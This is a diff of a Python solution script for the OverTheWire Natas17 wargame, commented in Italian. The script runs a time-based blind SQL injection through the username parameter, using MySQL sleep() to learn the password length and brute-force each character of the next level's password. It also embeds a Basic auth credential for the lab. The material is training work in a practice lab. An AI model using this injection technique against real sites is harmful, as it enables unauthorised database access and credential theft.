@@ -1,146 +1,116 @@
-from requests import get
-from urllib.parse import quote
-from requests.auth import HTTPBasicAuth
-from string import ascii_lowercase
-from string import ascii_uppercase
-from time import time
+''' 
+Solution-Script for Natas17 - OverTheWire
+
+Daruma's_eye
+'''
+from string import ascii_letters
+from string import digits
 from time import sleep
+from time import time
+from requests import get            # ==>  per fare richieste get
+from urllib.parse import quote      # ==>  per fare codificare l'injection in codifica URL
+alpha_numeric  = ascii_letters + digits
+delay          = 0.1
+sleep_sec      = 1
 
-#natas18"+if(password like '__...___', 0,sleep(5)); #
+#Header delle richieste get, viene usato il campo Auth per accdere al sito tramite password,
+#   il valore è un base64 dell'utente e della password
+header={'Host'         : 'natas17.natas.labs.overthewire.org'\
+       ,'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='}
 
-char_well = ascii_lowercase+ascii_uppercase+'0123456789'
-semaphore=0
-char_num=32
-sleep_sec=1
 
-head={'Host': 'natas17.natas.labs.overthewire.org'\
-,'Accept-Encoding': 'gzip, deflate'\
-,'DNT': '1'\
-,'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='}
 
-payload = 'natas18"+if(password like \''
+#Nella prima parte si applica la query { natas18" and if(password like '___' , sleep(1), 0); # } 
+#   al campo username per stimare la lunghezza della password, si utlizza elapsed.seconds per
+#   confrontarlo con il tempo dello sleep mysql nell'injection
+incomplete_injection = 'natas18" and if(password like \''
 
-while(semaphore==0 and char_num==0):
-    char_num=char_num+1
-    print('Testing password of '+str(char_num)+' chars')
-    payload= payload+'_'
-    payload2= payload+'\', sleep('+str(sleep_sec)+'), 0); # ' 
-    payload2 = quote(payload2,safe='')
-    link='http://natas17.natas.labs.overthewire.org/?username='+payload2
+password_length = 0
+while True:
+
+    password_length += 1
+    incomplete_injection = incomplete_injection + '_'
+    injection = incomplete_injection + '\', sleep(' +str( sleep_sec )+ '), 0); # '
+    print( 'Testing password of '+str( password_length )+' chars: with '+injection )
     
-    elapsed_time=time()
-    req = get(link, headers=head)
-    elapsed_time=time()-elapsed_time
-
-    if(req.status_code==200):
-        if(elapsed_time>=sleep_sec):
-            print('Request produced http_code 200 in '+str(elapsed_time)+' secs > '+str(sleep_sec)+'\nRetesting in 1 sec...')
-            sleep(1)
-            elapsed_time=time()
-            req = get(link, headers=head)
-            elapsed_time=time()-elapsed_time
-            if(elapsed_time>=sleep_sec):
-                semaphore=1
+    injection = quote( injection,safe= '')
+    url = 'http://natas17.natas.labs.overthewire.org/?username='+ injection
+    
+    req  = get( url, headers= header )
+    
+    if( req.status_code == 200 ):
+        if( req.elapsed.seconds >= sleep_sec ):
+            
+            #Potrebbe succedere che a causa di ritardi nella rete una richiesta impieghi più tempo del previsto
+            #   per sicurezza viene effettuata una seconda prova
+            print( 'Request produced http_code 200 in ' +str( req.elapsed.seconds )+ ' secs > ' +str( sleep_sec )+ '\nRetesting in 1 sec...')
+            sleep ( 1 )
+            req = get( url , headers= header )
+            if( req.elapsed.seconds >= sleep_sec ):
+                break
             
     else:
-        print('######## HTTP ERROR: '+str(req.status_code)+'########\nRetrying...')
-        payload= payload[0:len(payload)-1]
-        char_num=char_num-1
-    sleep(.1)
+        print('########## HTTP ERROR: ' +str( req.status_code )+ '##########\nRetrying...')
+        incomplete_injection = incomplete_injection[ 0:len( incomplete_injection )-1]
+
+    sleep( delay )
+
+print( 'It seems that the password is '+str( password_length )+' chars long.\nWe can proceed with bruteforcing...' )
+
+sleep( 0.5 )
 
 
-print('Seems that the password is '+str(char_num)+' chars long')
-
-print('Creating a list o chars for the password')
-payload = 'natas18"+if(password like \'%'
-
-strained_chars=''
-filtered=''
-if(strained_chars==''):
-    for char in char_well:
-        payload2= payload+char+'%\', sleep('+str(sleep_sec)+'), 0); # ' 
-        print('Testing '+payload2)
-        payload2 = quote(payload2,safe='')
-        link='http://natas17.natas.labs.overthewire.org/?username='+payload2
-    
-        elapsed_time=time()
-        req = get(link, headers=head)
-        elapsed_time=time()-elapsed_time
-
-        if(req.status_code==200):
-            if(elapsed_time>=sleep_sec):
-                print('Request produced http_code 200 in '+str(elapsed_time)+' secs > '+str(sleep_sec)+'\nRetesting in 1 sec...')
-                sleep(1)
-                elapsed_time=time()
-                req = get(link, headers=head)
-                elapsed_time=time()-elapsed_time
-                if(elapsed_time>=sleep_sec):
-                    strained_chars= strained_chars+char
-                    print('Char Present!')
-            else:
-                filtered=filtered+char
-        
-            
-        else:
-            print('######## HTTP ERROR: '+str(req.status_code)+'########\nRetrying...')
-            payload= payload[0:len(payload)-1]
-            char_num=char_num-1
-        sleep(.3)
-
-print(filtered)
-
-
-print('Seems that the password contain only this characters: \''+strained_chars+'\'\nThe dictionary has been shrunk by '+str(int((len(char_well)*100/len(strained_chars)))-100)+'%!')
-print('Finally Bruteforcing Password...')
-
-sleep(1)
-
+#Nella seconda parte si si applica la query { natas18" and if(password like '%' , sleep(1), 0); # } 
+#   come nella prima parte ma in questo caso si fa il bruteforcing carattere per carattere 
 password=''
 i=0
-while(i<char_num-len(password)):
-    payload = 'natas18"+if(password like binary \''
+while( i < password_length ):
     
-    for char in strained_chars:
-        print('Testing char '+char+' for position '+str(i))
-        payload2=payload+password+char
-        if(i!=char_num-len(password)-1):
-            payload2= payload2+'%'
+    for char in alpha_numeric:
+        
+        print( 'Testing char '+ char +' for position '+ str(i) )
+        injection = 'natas18" and if(password like binary \'' + password + char
+        
+        if( i!= password_length -1 ):
+            injection = injection +'%'
+        injection = injection +'\', sleep(' +str( sleep_sec )+ '), 0); # ' 
+        print( 'Testing '+injection )
 
-        payload2= payload2+'\', sleep('+str(sleep_sec)+'), 0); # ' 
-        print('Testing '+payload2)
-        payload2 = quote(payload2,safe='')
-        link='http://natas15.natas.labs.overthewire.org/?username='+payload2
-    
-        elapsed_time=time()
-        req = get(link, headers=head)
-        elapsed_time=time()-elapsed_time
+        injection = quote( injection,safe='' )
+        url = 'http://natas17.natas.labs.overthewire.org/?username=' + injection
+        req = get( url, headers= header )
 
-        if(req.status_code==200):
-            if(elapsed_time>=sleep_sec):
-                print('Request produced http_code 200 in '+str(elapsed_time)+' secs > '+str(sleep_sec)+'\nRetesting in 1 sec...')
+        if( req.status_code==200 ):
+            if( req.elapsed.seconds >= sleep_sec ):
+
+                #Potrebbe succedere che a causa di ritardi nella rete una richiesta impieghi più tempo del previsto
+                #   per sicurezza viene effettuata una seconda prova
+                print( 'Request produced http_code 200 in ' +str( req.elapsed.seconds )+ ' secs > ' +str( sleep_sec )+ '\nRetesting in 0.5 sec...' )
                 sleep(.5)
-                elapsed_time=time()
-                req = get(link, headers=head)
-                elapsed_time=time()-elapsed_time
-                if(elapsed_time>=sleep_sec):
-                    password=password+char
-                    print('Char Present!')
-                    break;
+                req  = get( url, headers= header )
+                if( req.elapsed.seconds >= sleep_sec ):
+                    password = password+char
+                    print( 'The char of position '+ str(i) +' is : '+ char )
+                    break
             
-            elif(char=='9'):
-                i=i-1
+            #Nel caso in cui non si trova una corrispondenza finendo i caratteri a disposizione
+            #   si ipotizza che ci sia stato un problema con la richiesta e quindi si decrementa
+            #   la i per riprovare la posizione che ha fallito
+            elif( char == '9' ):
+
+                i-= 1
                 break
             
         else:
-            print('######## HTTP ERROR: '+str(req.status_code)+'########\nRetrying...')
-            password= password[0:len(password)-1]
+
+            print( '########## HTTP ERROR: ' +str( req.status_code )+ '##########\nRetrying...' )
+            password = password[ 0:len( password )-1 ]
             i=i-1
             break
 
-        sleep(.3)
-    i=i+1
+        sleep( delay )
 
-   
+    i+= 1
 
-print('We have the password! Here it is: '+password)
+print( 'We have the password! Here it is: '+password )
 
